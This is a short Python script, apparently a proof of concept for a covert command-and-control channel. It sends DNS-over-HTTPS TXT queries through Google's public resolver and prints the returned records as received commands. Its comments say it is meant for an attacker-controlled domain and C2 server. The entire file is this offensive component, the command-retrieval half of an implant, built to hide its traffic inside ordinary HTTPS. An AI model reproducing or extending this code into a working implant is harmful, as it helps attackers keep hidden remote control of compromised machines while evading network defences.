import requests
import dns.message
import base64


def send_doh_query(domain, doh_resolver_url="https://dns.google/dns-query"):
    # Create a DNS query for a TXT record
    query = dns.message.make_query(domain, 'TXT')
    # Convert to wire format and base64 encode for URL-safe transmission
    query_wire = base64.urlsafe_b64encode(
        query.to_wire()).decode('utf-8').strip("=")

    headers = {"Accept": "application/dns-message"}
    # For GET requests (RFC 8484, Section 4.1)
    response = requests.get(
        f"{doh_resolver_url}?dns={query_wire}", headers=headers)

    if response.status_code == 200:
        # Parse the DNS response
        response_dns = dns.message.from_wire(response.content)
        # Extract TXT records for commands
        for rrset in response_dns.answer:
            if rrset.rdtype == dns.rdtypes.ANY.TXT.rdtype:
                for rdata in rrset:
                    print(f"Received command: {rdata.strings[0].decode()}")
        return response_dns
    else:
        print(f"DoH query failed: {response.status_code}")
    return None


# Example usage:
# You need a domain that you control and a C2 server that can respond to DNS queries with TXT records.
# For this PoC, we will use a public domain that is known to have TXT records.
send_doh_query("google.com")
